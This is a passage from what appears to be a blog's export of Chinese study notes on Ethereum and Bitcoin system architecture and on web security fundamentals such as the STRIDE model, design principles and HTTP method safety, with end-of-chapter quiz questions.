收到节点A广播的区块哈希的节点，根据需要可以从发送给它消息的节点A那里获取对应的完整区块，获取区块后再加入到等待验证的区块队列；</p><p>(4) 等待验证的区块队列中的区块经过验证确认后，最终插入节点本地区块链，节点再将新区块哈希广播给与它相连但还不知道该新区块的节点。</p><h3 id="以太坊系统共识层"><a href="#以太坊系统共识层" class="headerlink" title="以太坊系统共识层"></a>以太坊系统共识层</h3><h4 id="PoW工作量证明共识机制"><a href="#PoW工作量证明共识机制" class="headerlink" title="PoW工作量证明共识机制"></a><strong>PoW工作量证明共识机制</strong></h4><p>以太坊采用了Ethash算法作为其工作量证明算法。Ethash算法具有与算力大小和内存容量均相关的特性。</p><h4 id="PoS共识机制"><a href="#PoS共识机制" class="headerlink" title="PoS共识机制"></a><strong>PoS共识机制</strong></h4><p><strong>每一轮记账权由当时具有最高权益值的节点获得，最高权益值的计算并不仅仅依赖于节点算力的高低</strong></p><h3 id="以太坊系统激励层"><a href="#以太坊系统激励层" class="headerlink" title="以太坊系统激励层"></a><strong>以太坊系统激励层</strong></h3><p><strong>(1)</strong> <strong>加密货币总量无限制</strong>：以太坊系统并没有规定以太币的供应上限。</p><p><strong>(2)</strong> <strong>出块激励</strong>：以太坊系统没有出块奖励减半机制，以太坊系统上线之初每个新区块的出块奖励为5个以太币。在以太坊系统第三个阶段（大都会阶段），出块奖励调整过两次：2017年10月的拜占庭升级，出块奖励由5个以太币降为3个；2019年3月的君士坦丁堡升级，出块奖励由3个以太币降为2个；未来以太坊的出块奖励可能还会继续调整。</p><p><strong>(3)</strong> <strong>叔块激励</strong>：为了提高系统的交易性能，以太坊系统把出块时间缩短到平均10秒左右，更短的出块时间意味着在同一时刻，可能出现多个节点都求解出难题获得了新区块的记账权，但是在这些新区块中，只有一个将成为最长链上的区块，而其它区块，如果能被后续区块引用，将被称为叔块。</p><p><strong>(4)</strong> <strong>交易激励</strong>：在以太坊系统中，每一次交易的执行都需要消耗一定的费用，这个费用被命名为“燃料（Gas）”，Gas的值并不直接使用以太币ETH表示，而是使用GWei作为单位，</p><p>  <strong>例如：8 GWei &#x3D; 0.000000008 ETH</strong></p><p>   <strong>在以太坊系统的交易数据中有Gas的单价（Price）与需要消耗的Gas数量（GasLimit）属性，交易费用的计算公式如下：</strong></p><p>   <strong>交易费 &#x3D; Gas的单价 × 消耗的Gas数量</strong></p><p>   在以太坊系统中，交易可分为转账类型与智能合约相关类型，<strong>每一笔转账类型的交易，无论转账数额大小，系统规定最少消耗21000个 Gas数量</strong>，如果要在交易中额外添加备注信息，需要消耗额外的 Gas数量。</p><h4 id="l叔块机制"><a href="#l叔块机制" class="headerlink" title="l叔块机制"></a>l<strong>叔块机制</strong></h4><h3 id="以太坊系统合约层"><a href="#以太坊系统合约层" class="headerlink" title="以太坊系统合约层"></a><strong>以太坊系统合约层</strong></h3><h4 id="智能合约机制"><a href="#智能合约机制" class="headerlink" title="智能合约机制"></a><strong>智能合约机制</strong></h4><p>以太坊智能合约是一种采用Solidity语言开发的程序，经过编译的合约程序，只能通过以太坊合约账户以交易的形式发布到区块链上，交易信息中将附带合约程序的全部二进制字节码数据，并被打包保存到区块中，因此利用区块链的特性，智能合约一旦发布，合约的签订方就不可能被篡改或抵赖。</p><p><strong>以太坊系统合约层提供对智能合约的全生命周期管理，包括合约的创建、合约的部署运行、合约的调用执行、合约的作废。</strong></p><h3 id="课后"><a href="#课后" class="headerlink" title="课后"></a>课后</h3><p><strong>（一）填空题</strong></p><p><strong>1. 在以太坊系统中，每个区块由      、     和      三部分组成。</strong></p><p><strong>2. 以太币的标准单位是      ，最小单位是      ，1个标准单位的以太币等于       个最小单位的以太币。</strong></p><p><strong>3. 以太坊网络中存在      、       、      等不同类型的节点，其中      节点所需的存储空间最大。</strong></p><p><strong>4. 在以太坊系统中，账户分为       和       两类。</strong></p><p><strong>5. 在以太坊系统中，创建智能合约类型交易的交易接收方地址值为      。</strong></p><p><strong>6. 以太坊智能合约的全生命周期包括      、      、      和合约的作废。</strong></p><p><strong>（二）选择题</strong></p><p><strong>1. 在以太坊系统区块链的每个区块中不包含（   ）的哈希值。</strong></p><p><strong>A. 父区块      B. 交易树根      C. 子区块       D. 收据树根</strong></p><p><strong>2. 以太坊系统采用（   ）模型构建分布式账本，即每个用户都有直接的余额信息。</strong></p><p><strong>A. UTXO      B. 账户       C. 数据库       D. 会计</strong></p><p><strong>3. 以太坊系统是使用（   ）作为账户的唯一索引标识。</strong></p><p><strong>A. 地址      B. 伪随机数     C. 账户编号      D. 随机数</strong></p><p><strong>4. 在以太坊系统中，用于保存用户拥有的以太币余额的账户是（   ）。</strong></p><p><strong>A. 合约账户    B. 外部账户     C. 普通账户      D. 交易账户</strong></p><p><strong>5. 在以太坊系统中，交易可以分为多种类型，下面不属于以太坊交易类型的是（   ）。</strong></p><p><strong>A. 转账支付    B. 创建合约     C. 创建账户      D. 调用合约</strong></p><p><strong>6. 以太坊系统采用的共识机制主要依赖节点的（    ）进行出块权的竞争计算。</strong>**</p><p><strong>A. 算力      B. 内存容量     C. 算力+内存容量   D. 网络带宽</strong></p><p><strong>7. 以太坊系统智能合约采用的系统默认开发语言是（    ）。</strong></p><p><strong>A. Java       B. Go        C. Solidity       D. JavaScript</strong></p><p><strong>8. 在以太坊系统中，一个创建合约类型的交易的接收方地址（Recipient）字段值应为（    ）。</strong></p><p><strong>A.节点地址    B.空          C.外部账户地址     D.合约账户地址</strong></p><p><strong>9. 以太坊系统除了正在使用的PoW共识机制外，计划在后续版本中支持（   ）共识机制。</strong></p><p><strong>A. Paxos      B. PoS        C. DPoS        D. PBFT</strong></p><p><strong>（三）简答题（任选3道）</strong></p><p><strong>1. 请简述以太坊系统的区块链中各个区块是怎么链接的？</strong></p><p><strong>2. 请简述以太坊系统的账户地址是怎样生成的？</strong></p><p><strong>3. 请简单分析以太坊系统PoW共识机制节点竞争计算生成新区块的过程？</strong></p><p><strong>4. 请简述为什么以太坊系统要引入叔区块（UncleBlock）机制？</strong></p><p><strong>5. 请简单分析以太坊系统的账户与与传统的中心化系统的账户具有的不同之处？</strong></p><p><strong>6. 请简述以太坊系统PoW共识机制采用的Ethash算法的主要计算过程？</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链原——比特币系统</title>
      <link href="/2024/12/08/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/12/08/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="比特币区块链系统架构"><a href="#比特币区块链系统架构" class="headerlink" title="比特币区块链系统架构"></a><strong>比特币区块链系统架构</strong></h2><p><strong>背景</strong>：比特币系统作为世界上第一个大规模成功运营的区块链系统，也建立了区块链系统体系结构的标准——P2P体系结构，即对等网络结构。</p><ul><li><p>每个节点都通过底层的P2P网络协议发现、连接其它区块链网络节点，并提供P2P网络的路由功能；</p></li><li><p>个节点可以通过PoW共识机制竞争计算新区块的出块权（俗称“挖矿”）；</p></li><li><p>每个节点都可以存储完整的区块链与账本数据，每个节点都可以发起和监听比特币网络上的交易信息，验证每个交易和区块的合法性</p></li></ul><h3 id="关于节点"><a href="#关于节点" class="headerlink" title="关于节点"></a>关于节点</h3><p><strong>节点总体上可以分为“全节点”、“轻节点”等两大类，其中发挥核心作用的是全节点。</strong></p><h4 id="全节点"><a href="#全节点" class="headerlink" title="全节点"></a>全节点</h4><ul><li><p><strong>全节点是比特币系统中功能最完整的节点</strong>，全节点一般要求保持一直在线，主要负责执行以下功能：</p></li><li><p><strong>参与区块记账权的竞争</strong>，通过PoW共识机制竞争下一个新区块的出块权，获得出块权的节点将获得系统激励，激励的方式就是奖励一定数量的比特币，也是比特币这种加密货币的唯一产生来源。</p></li><li><p><strong>存储完整的区块链与账本数据</strong>，每个全节点都保存了一个相同区块链与账本数据副本，自2009年比特币系统上线运行至今，每个全节点的区块链与账本数据存储容量已超过500GB。</p></li><li><p><strong>提供P2P网络路由与同步服务</strong>，监听系统网络上的交易、区块及事件信息，对接收到的交易和区块数据进行验证，并通过Gossip协议进行数据分发与同步。</p></li></ul><h4 id="轻节点"><a href="#轻节点" class="headerlink" title="轻节点"></a>轻节点</h4><ul><li><strong>轻节点主要负责提供交易和钱包功能，不参与出块权的竞争计算，不会存储完整的区块链，只需要保存每个区块的区块头信息</strong>，以及与节点自身相关的交易信息，可以发起简单支付验证请求SPV（Simplified Payment Verification），向全节点请求数据来验证交易，也提供P2P网络的路由功能。</li></ul><h3 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a><strong>系统逻辑架构</strong></h3><p><img src="https://s2.loli.net/2024/12/08/EJ1BiRgwbcCTXlM.png" alt="1.png"></p><ol><li><p>比特币系统的<strong>存储层</strong>主要采用文件系统和LevelDBKey-Value数据库</p></li><li><p>比特币系统的<strong>数据层</strong>是系统核心功能层级之一。</p><p><strong>主要功能</strong>：</p><ul><li>对比特币系统核心的区块、区块链、交易、账本、地址等关键数据结构进行定义和处理</li><li>负责将交易打包进区块，由区块组成区块链</li><li>没有采用传统的账户&#x2F;余额模型，而是采用特殊的UTXO模型构建账本数据，并基于底层的存储服务提供对比特币区块链数据的安全读写访问管理。</li></ul></li><li><p>比特币系统的<strong>网络层</strong>是系统核心功能层级之一，主要采用非结构化P2P网络，基于Gossip数据分发协议</p><p><strong>主要功能</strong>：</p><ul><li>实现网络节点快速发现与连接，以及区块、交易数据的分发与同步</li><li>为比特币系统各网络节点之间提供节点发现与安全连接通信机制</li><li>为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。</li></ul></li><li><p>比特币系统的<strong>共识层</strong>是系统核心功能层级之一，采用PoW工作量证明共识机制</p></li></ol><p>​<strong>主要功能</strong>： </p><ul><li>​让所有的比特币网络节点都认可每次计算产生的新区块</li><li>​ 并且协调保证所有比特币网络节点数据记录一致性，使比特币系统的整体状态达成一致。</li></ul><ol start="5"><li><p>比特币系统的<strong>激励层</strong>在共识层的功能基础上，提供了总量有限的比特币发行和出块激励机制，对于加入比特币网络的节点，都能公平地通过参与PoW工作量证明竞争计算，都有一定机率被区块链系统增发奖励一定数量的比特币。</p></li><li><p>比特币系统的<strong>合约层</strong>没有提供真正意义的智能合约功能，而是基于一种非图灵完备的、基于逆波兰表示法的Script脚本语言开发技术，提供交易相关<strong>锁定脚本&#x2F;解锁脚本</strong>的定制。</p></li></ol><hr><p>什么是锁定脚本&#x2F;解锁脚本?</p><hr><ol start="7"><li><p>比特币系统的<strong>接口层</strong>提供了基于JSON RPC的SDK接口和命令行接口。</p></li><li><p>比特币系统的<strong>应用层</strong>基于接口层提供的SDK接口，可以基于比特币区块链实现面向电子支付等多种应用场景和业务逻辑的公有链应用</p></li></ol><h2 id="比特币系统数据层"><a href="#比特币系统数据层" class="headerlink" title="比特币系统数据层"></a><strong>比特币系统数据层</strong></h2><h3 id="区块与区块链"><a href="#区块与区块链" class="headerlink" title="区块与区块链"></a><strong>区块与区块链</strong></h3><p>   在比特币系统中，<strong>区块（Block）是区块链系统中最基本的数据单元，用于表示和记录区块链系统一段时间内发生的交易和状态结果</strong>的数据结构，是区块链系统各节点竞争完成一次共识计算的结果，多个区块采用链式结构链接在一起就构成了区块链（Blockchain）。每个区块<strong>又由区块头（Block Head）和区块体（Block Body）</strong>两部分组成。</p><p><img src="https://s2.loli.net/2024/12/08/ODqwtiFVTS9A2uz.png" alt="2.png"></p><p>在区块链系统的所有区块中，<strong>第一个区块被称为“创世区块”</strong>。每个区块中存储了一定数量的交易数据，都由交易发起人的数字签名来保证其真实性和合法性，从第二个区块开始，每个区块都保存了前一个区块（父区块）的区块头的哈希值，<strong>区块之间首尾相互连接就构成链式结构，因而先前区块里的任何数据都不可被篡改</strong></p><p><img src="https://s2.loli.net/2024/12/08/FTeoXCIjDL68cZ1.png" alt="3.png"></p><p><img src="https://s2.loli.net/2024/12/08/7HCfYpGqniOxhR1.png" alt="5.png"></p><h4 id="账本数据"><a href="#账本数据" class="headerlink" title="账本数据"></a>账本数据</h4><p><strong>在一个传统的具有支付功能的系统中，每个用户都有一个资金账户，支付系统会对每个账户的余额进行单独地记录和管理。当系统中有用户之间发生了支付的交易，系统会分别对参与交易的账户的余额信息进行检查和修改。</strong></p><p>（例如，甲向乙转账50元，首先需要检查甲的账户中有50元的余额，再从甲的账户中扣除50元，并向乙的账户中添加50元。可以看到，为了保证整个系统的正确性，系统需要确保对应的支付前提条件，如甲的账户中至少有50元的余额，同时也需要<strong>保证整个支付交易过程的原子性、一致性、隔离性及持久性（ACID）</strong>，即保证从甲账户扣减金额和向乙账户增加相同数量的金额这两个操作必须同时执行和完成，一旦受其他事件影响中断，甲和乙的账户必须恢复到交易前的状态。）</p><p>在比特币系统中没有直接的“账户”概念，而是用“账户地址”来代表用户的账户，相当于银行卡卡号，任何人都可以通过你的账户地址给你转账比特币。</p><p>​    <strong>(1)</strong> <strong>账户地址</strong></p><p>​    <strong>比特币的账户地址就是用户的公钥经过哈希计算及Base58编码运算后生成的160位（20字节）的字符串，账户地址计算生成流程。</strong></p><p><img src="https://s2.loli.net/2024/12/08/2kw4OhunQXGs8fC.png" alt="4.png"></p><h4 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h4><p>   <strong>(2)</strong> <strong>账本数据模型</strong></p><p>​    <strong>比特币系统账本没有采用传统的“账户&#x2F;余额”模型，而是提出了一种独特的UTXO（Unspent Transaction Output）未消费的交易输出模型，简称比特币UTXO模型。UTXO是一个包含交易数据和对应的执行代码的数据结构，所有的UTXO条目构成了比特币系统的“账本”。</strong></p><p>​    <strong>UTXO模型的本质是通过交易记录来构成系统账本，而不是通过账户信息构成账本。在比特币的每一笔支付交易中，都有“交易输入”（标识资金来源）和“交易输出”（标识资金去向），且每个交易都可以有多个交易输入和多个交易输出，交易之间按照时间戳的先后顺序排列，且任何一个交易中的交易输入都是其前序的某个交易中产生的“交易输出”，而所有交易的最初的交易输入都来自比特币系统节点生成区块得到的激励（比特币）。</strong></p><p>比特币系统中的每个“账户”可以视为对应着某个地址，比特币区块链不会直接跟踪每个地址的比特币余额，而是在区块链中存储交易数据的整个历史，比特币系统通过“交易池”跟踪区块链网络中所有UTXO的集合，而某个地址在某个时间点所具有的“余额”，是通过检查、求和与该地址相关的所有UTXO来计算。当使用UTXO时，它将从交易池中被删除，这将实时在计算余额时反映出来。</p><h4 id="交易数据结构"><a href="#交易数据结构" class="headerlink" title="交易数据结构"></a><strong>交易数据结构</strong></h4><p>​    在比特币的每一笔交易数据中，都包含一个或多个“交易输入”（标识资金来源）、一个或多个“交易输出”（标识资金去向）、交易时间戳等信息。</p><p><img src="https://s2.loli.net/2024/12/08/VK5SRgFi2ayNOCr.png" alt="6.png"></p><h5 id="交易输入数据结构"><a href="#交易输入数据结构" class="headerlink" title="交易输入数据结构"></a>交易输入数据结构</h5><h5 id="交易输出数据结构"><a href="#交易输出数据结构" class="headerlink" title="交易输出数据结构"></a>交易输出数据结构</h5><h4 id="状态数据"><a href="#状态数据" class="headerlink" title="状态数据"></a>状态数据</h4><p>在比特币系统中，交易表示一次价值转移操作，会导致账本状态的一次改变，如增加了一条交易记录；区块表示记录一段时间内发生的交易和状态结果，是对当前账本状态的一次共识和确认；链是由一个个区块按照发生时间顺序串联而成，可以看作是整个区块链状态变化的日志记录。</p><p><strong><strong>在一个比特币区块的区块头中包含了Merkle树根的哈希值，在区块体中包含了所有经过验证的交易数据。区块体中所有交易数据的哈希值构成了一棵Merkle树，每个叶子节点是每个交易信息的哈希值，将该Merkle树的根节点的值，称根哈希（Root Hash）或主哈希（Master Hash），存入区块头。</strong></strong></p><h3 id="比特币系统网络层"><a href="#比特币系统网络层" class="headerlink" title="比特币系统网络层"></a><strong>比特币系统网络层</strong></h3><h4 id="P2P网络结构"><a href="#P2P网络结构" class="headerlink" title="P2P网络结构"></a><strong>P2P网络结构</strong></h4><p><strong>比特币系统采用的P2P网络属于非结构化P2P网络，不存在中心服务器，比特币网络中存在“全节点”、“轻节点”等不同类型的节点，不同类型的节点在网络中扮演的角色也有所不同，其中发挥核心作用的是全节点。</strong></p><h4 id="全节点-1"><a href="#全节点-1" class="headerlink" title="全节点"></a><strong>全节点</strong></h4><p>全节点要一直在线，是比特币P2P网络中功能最完整的节点，全节点要竞争计算新区块的出块权，会存储完整的区块链数据，要监听比特币网络上的交易信息，验证每个交易的合法性，并提供P2P网络的路由功能。</p><h4 id="轻节点-1"><a href="#轻节点-1" class="headerlink" title="轻节点"></a><strong>轻节点</strong></h4><p>​    <strong>轻节点不需要一直在线，不参与出块权的竞争计算，不会存储完整的区块链，只需要保存每个区块的区块头信息，以及与自己相关的交易信息，可以发起简单支付验证请求SPV，向全节点请求数据来验证交易，并提供P2P网络的路由功能。轻节点除了主要提供交易功能外，还常常提供钱包功能。</strong></p><p>​    比特币系统的P2P网络基于TCP构建，默认RPC通信服务端口是8332，默认数据同步端口是8333，比特币系统的P2P网络主要采用了Gossip协议来实现节点发现、节点连接、区块广播、交易广播等功能。</p><h4 id="节点发现管理"><a href="#节点发现管理" class="headerlink" title="节点发现管理"></a><strong>节点发现管理</strong></h4><h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a><strong>交易广播</strong></h4><p>在比特币系统中，节点为了向比特币系统发送一笔交易，需要向<strong>邻近的对等全节点</strong>发送Inv消息。如果接收到对等节点返回的GetData消息，节点再使用Tx消息向对等节点发送交易信息。对等节点接收到交易信息后，将以同样的方式向其它邻近节点转发交易信息。</p><p><img src="https://s2.loli.net/2024/12/08/p6GxrhvizQmdLHN.png" alt="7.png"></p><h4 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a><strong>交易池</strong></h4><p>比特币网络中每个节点都会维护一个未确认交易列表，称为“交易池”。节点使用交易池记录并跟踪等待被区块链系统确认的交易。例如，具有钱包功能的节点会使用交易池来记录那些已发送到网络但还未被确认的，只与该节点上的钱包相关的预支付交易信息。</p><p><strong>某些节点还维护一个单独的“孤立交易池”。所谓“孤立交易”是指，如果一个交易的输入与某未知的交易有关，如与缺失的父交易相关，该孤立交易就会被暂时存储在孤立交易池中直到父交易的信息到达。当一个交易被添加到交易池时，会同时检查孤立交易池，看是否有某个孤立交易引用了此交易的输出（子交易）。任何匹配的孤立交易会被进行验证。如果验证有效，它们会从孤立交易池中删除，并添加到交易池中。</strong></p><h4 id="区块广播与同步"><a href="#区块广播与同步" class="headerlink" title="区块广播与同步"></a><strong>区块广播与同步</strong></h4><h3 id="比特币系统共识层"><a href="#比特币系统共识层" class="headerlink" title="比特币系统共识层"></a><strong>比特币系统共识层</strong></h3><h4 id="PoW工作量证明共识机制"><a href="#PoW工作量证明共识机制" class="headerlink" title="PoW工作量证明共识机制"></a><strong>PoW工作量证明共识机制</strong></h4><p>比特币系统通过共识机制竞争计算生成新区块的过程，被称为“挖矿（Mine)”，因此比特币网络节点又被称为“矿工（Miner）”，后续如以太坊等其它区块链系统都延用了这种说法。</p><p><img src="https://s2.loli.net/2024/12/08/9ps7xHWcMnYlF43.png" alt="8.png"></p><h4 id="PoW共识机制的特点"><a href="#PoW共识机制的特点" class="headerlink" title="PoW共识机制的特点"></a><strong>PoW共识机制的特点</strong></h4><p><strong>比特币系统的PoW共识机制具有两大特点</strong>：</p><p>(1) 比特币系统PoW共识机制采用的“难题”具有难以解答，但很容易验证答案的正确性的特点，同时求解难题的“难度”，即比特币网络节点平均解出一个难题所消耗时间，是可以通过调整难题中的部分参数来进行控制的，因此比特币系统可以很好地控制链增长的速度；</p><p>(2) 通过控制区块链的增长速度，保证了如果一个节点成功解出难题完成了新区块的创建，该区块能够以更快的速度在所有节点之间传播，并且得到其他节点的验证，再结合比特币系统所采取的“最长链有效”的评判机制，就能够在大多数（超过比特币网络51%算力）节点都是诚实的情况下，避免恶意节点对区块链的控制。</p><h4 id="竞争出块冲突"><a href="#竞争出块冲突" class="headerlink" title="竞争出块冲突"></a><strong>竞争出块冲突</strong></h4><h3 id="比特币系统激励层"><a href="#比特币系统激励层" class="headerlink" title="比特币系统激励层"></a><strong>比特币系统激励层</strong></h3><h4 id="激励机制"><a href="#激励机制" class="headerlink" title="激励机制"></a>激励机制</h4><p><strong>在比特币系统中，比特币网络约每10分钟生成一个不超过1MB大小的区块，用于记录这10分钟内发生的验证过的交易内容，并将区块串联到最长的链尾部，每个区块的成功提交者可以得到系统一定数量的比特币的奖励（该奖励将作为区块内的第一个CoinBase交易，并将在一定区块数后才能使用），以及用户附加到交易上的支付服务费用。因此，即使没有任何用户交易，比特币网络也可以自行产生合法的区块并生成奖励。每个区块的奖励最初是50个比特币，每隔21万个区块（约4年时间）自动减半，最终比特币总量稳定在2100万个</strong></p><p><strong>比特币系统的激励机制主要包括以下要点：</strong></p><p>(1)加密货币总量固定：比特币总量不超过 2100 万个。</p><p>(2)出块激励：每当有节点获得一个区块的记账权，比特币系统就会发行出新的比特币作为对节点的奖励。一个区块产生的比特币数量都会按几何级数递减，每产出 21 万个区块，获得奖励的比特币数量就会减少 50% 。截至2022年，每个区块的奖励已降低为6.25个比特币，是比特币系统上线时的八分之一。</p><p>(3)交易激励：用户会在交易中包含交易费，作为处理交易的服务费支付给获得区块记账权的节点。</p><h3 id="比特币系统合约层"><a href="#比特币系统合约层" class="headerlink" title="比特币系统合约层"></a><strong>比特币系统合约层</strong></h3><h4 id="比特币系统的交易脚本"><a href="#比特币系统的交易脚本" class="headerlink" title="比特币系统的交易脚本"></a>比特币系统的交易脚本</h4><p>比特币系统没有账户机制，而采用了一种比较特别的 UTXO交易模型，类似于财务会计记账方法，每一笔交易数据主要包括两部分：交易输入记录和交易输出记录。</p><p>   （1）交易输出记录中除了包含输出比特币金额外，还包含了称为“锁定脚本”的一段脚本代码。</p><p>   （2）交易输入记录中除了包含对前一个交易输出部分的引用外，还包含了称为“解锁脚本”的一段脚本代码。</p><h4 id="交易脚本执行机制"><a href="#交易脚本执行机制" class="headerlink" title="交易脚本执行机制"></a><strong>交易脚本执行机制</strong></h4><p><strong>图灵完备性</strong></p><p><strong>逆波兰表示法</strong></p><h4 id="交易标准脚本"><a href="#交易标准脚本" class="headerlink" title="交易标准脚本"></a><strong>交易标准脚本</strong></h4><p><strong>（一）填空题</strong></p><p><strong>1. 在比特币系统中，每个区块又由      和      两部分组成。</strong></p><p><strong>2.    年  月，随着比特币区块链系统生成了第一个区块，标志着世界上第一个区块链系统的诞生。</strong></p><p><strong>3. 比特币的标准单位是      ，最小单位是      ，1个标准单位的比特币等于       个最小单位的比特币。</strong></p><p><strong>4. 比特币系统的发行量每四年减半，总量上限为    万枚，并且无法被超发。</strong></p><p><strong>5. 比特币网络中存在     、     等不同类型的节点，不同类型的节点在网络中扮演的角色也有所不同。</strong></p><p><strong>6. 比特币系统每个区块的区块体所包含的交易记录列表，实际上就是可以用于唯一标识与检索指定交易的交易哈希值列表，区块头中将存储由所有交易哈希值构造的     树的根哈希值。</strong></p><p><strong>（二）选择题</strong></p><p><strong>1. 在区块链系统的所有区块中，第一个区块被称为（   ）。</strong></p><p><strong>A. 初始区块    B. 创世区块      C. 元区块      D. 头区块</strong></p><p><strong>2. 在比特币系统区块链的每个区块的区块头中会保存多个哈希值，但没有保存（   ）。</strong></p><p><strong>A. 当前区块整体的哈希值         B. 当前区块的区块头的哈希</strong></p><p><strong>C. 前一个区块的区块头的哈希值      D. 下一个区块的区块头的哈希值</strong></p><p><strong>3. 比特币系统采用（   ）模型，通过交易记录来构成系统账本。</strong></p><p><strong>A. UTXO      B. 账户       C. 数据库       D. 会计</strong></p><p><strong>4. 比特币的账户地址就是（   ）经过一系列哈希计算及Base58编码运算后生成的160位（20字节）的字符串。</strong></p><p><strong>A. 用户私钥    B. 用户公钥     C. 随机数       D. 节点IP地址</strong></p><p><strong>5. 在比特币系统中，每一笔交易数据中不包含的是（    ）。</strong></p><p><strong>A. 交易输入    B. 交易输出     C. 交易哈希      D. 交易金额</strong></p><p>（<strong>三）简答题（任选3道）</strong></p><p><strong>1. 请简述比特币系统的区块链中各个区块是怎么链接的</strong>？</p><p><strong>2. 请简述比特币系统的“账户地址”是怎样计算生成的</strong>？</p><p><strong>3. 请简单分析比特币系统PoW共识机制节点竞争计算生成新区块的过程</strong>？</p><p><strong>4. 请简述比特币系统的出块激励规则</strong>？</p><p><strong>5. 请简述比特币系统如何处理竞争出块冲突和孤块</strong></p><p><strong>6.什么是比特币区块链系统的Layer2技术，请分析一个典型的比特币Layer2项目？</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全</title>
      <link href="/2024/12/01/WEB%E5%AE%89%E5%85%A8/"/>
      <url>/2024/12/01/WEB%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="如何实施安全评估："><a href="#如何实施安全评估：" class="headerlink" title="如何实施安全评估："></a>如何实施安全评估：</h4><p>资产等级划分—威胁建模—风险分析—设计安全方案</p><ol><li>资产等级划分</li></ol><p><strong>划分信任域</strong></p><p>  根据网络逻辑划分（信任程度：数据库&gt;web应用&gt;Internet）</p><p>互联网安全核心——数据安全</p><ol start="2"><li>威胁建模</li></ol><p><strong>找出威胁</strong></p><p>方法：STRIDE模型</p><table><thead><tr><th>威胁</th><th>定义</th><th>对应安全属性</th></tr></thead><tbody><tr><td>Spoofing(伪装)</td><td>冒充他人身份</td><td>认证</td></tr><tr><td>Tampering（篡改）</td><td>修改数据或代码</td><td>完整性</td></tr><tr><td>Repudiation（抵赖）</td><td>否认做过的事情</td><td>不可抵赖性</td></tr><tr><td>Information Disclosure(信息泄露)</td><td>机密信息泄露</td><td>机密性</td></tr><tr><td>Denial of service(拒绝服务)</td><td>拒绝服务</td><td>可用性</td></tr><tr><td>Elevation of Privilege(提升权限)</td><td>未经授权获得许可</td><td>授权</td></tr></tbody></table><ol start="3"><li>风险分析</li></ol><p><strong>判断风险高低</strong>（风险&#x3D;可能性*潜在危害）</p><p> 方法：DREAD模型</p><ol start="4"><li>设计安全方案</li></ol><p>安全是产品的属性</p><p><strong>优秀安全方案所具备特点：</strong></p><ul><li>能够解决问题</li><li>用户体验好</li><li>高性能</li><li>低耦合</li><li>易于扩展与升级</li></ul><h4 id="安全方案设计原则："><a href="#安全方案设计原则：" class="headerlink" title="安全方案设计原则："></a><strong>安全方案设计原则：</strong></h4><p> 1.“默认安全原则”</p><p>a.    专家系统：黑名单&amp;白名单</p><p>   （白名单-允许&#x2F;黑名单-不允许）</p><p>b.    最小权限原则（不要过度授权）</p><p>c.    “纵深防御”原则——类似圈层防御</p><p>l 从不同层面、不同方面实施安全方案</p><p>具有根本性，针对性</p><p>d.    “数据与代码分离”原则</p><p>这一原则适用于各种由于“注入”而引发安全问题的场景</p><p>Eg:将页面代码中将“<script>”标签变成代码片段的一部分（对<>等符号进行处理）</p><p>e.    “随机性”原则</p><ol><li><p>利用计算的单向（当逆推时，计算变得十分复杂）性，生成随机字符串，攻击者猜中的概率就很小，增加安全性。</p></li><li><p>随机性（不可预测性）——提高篡改、伪造等攻击 的门槛</p></li><li><p>注意计算机中采用的随机数一般是伪随机数</p></li></ol><h4 id="HTTP协议与Web应用"><a href="#HTTP协议与Web应用" class="headerlink" title="HTTP协议与Web应用"></a>HTTP协议与Web应用</h4><p>HTTP协议中与安全有关的知识</p><p> http协议只能由客户端单向发起请求，服务端（一般为浏览器）再响应请求。</p><p>​                               </p><p>出于安全考虑，要遵循以下基本原则：</p><ol><li><p>GET和HEAD方法应当只用于对服务端没有副作用的操作（即“只读”操作）。对于GET请求，浏览器在刷新页面时不会要求用户确认，对于有副作用（即增加，删除，更改数据）的POST请求，在刷新界面时会询问用户是否要重新发送，避免多余操作（重复下单等）</p></li><li><p>PUT和DELETE一般用于直接上传和删除文件（大部分不会用到，且若被攻击时很危险，无需求时应该禁用）</p></li><li><p>尽量用POST提交敏感数据，用GET提交易造成数据的泄露。</p></li><li><p>在服务端获取请求参数时，应当说清是从GET参数还是从POST参数请求</p></li><li><p>TRACE方法通常用于诊断调试，服务端直接返回请求中的内容（生产环境的服务器应当禁用TRACE）</p></li><li><p>CONNECT方法用于在客户端和目标地址之间建立一个TCP隧道，只有初始请求是HTTP协议，后续所有双向流量都是在TCP连接上传输的</p></li></ol><p>Referer头指示了当前请求是从哪个URL页面发起的（URL中一般不要包含敏感信息，可能造成信息泄露）</p><p><strong>关于HTTP响应：</strong></p><p> HTTP响应与请求是一一对应的，响应中版本号不一定要与请求中的版本号一样，但是其大版本号不能高于请求的大版本号，例如请求是HTTP/1.0版本的，服务器响应不能为HTTP/2但是可以为HTTP/1.1版本的</p><p>对<strong>状态码：</strong></p><p>分析状态码可以实现简单的安全监测（Eg:一个访问者在短时间内产生大量404响应，很可能是有攻击者在做网站扫描探测；某页面有大量500响应，可能意味着程序存在BUG等或被攻击行为）</p><p>HTTP的响应头是通过“\r\n”分割的</p><p><img src="https://s2.loli.net/2024/12/01/6EFGWABzYn7tbqU.jpg" alt="1.jpg"></p><p><img src="https://s2.loli.net/2024/12/01/8bog7nRvIpmqFcx.jpg" alt="2.jpg"></p><p><img src="https://s2.loli.net/2024/12/01/24pKLQW9G3XxbiM.jpg" alt="3.jpg"></p><p><img src="https://s2.loli.net/2024/12/01/YCcQRwT6ZD8aej4.jpg" alt="4.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础四</title>
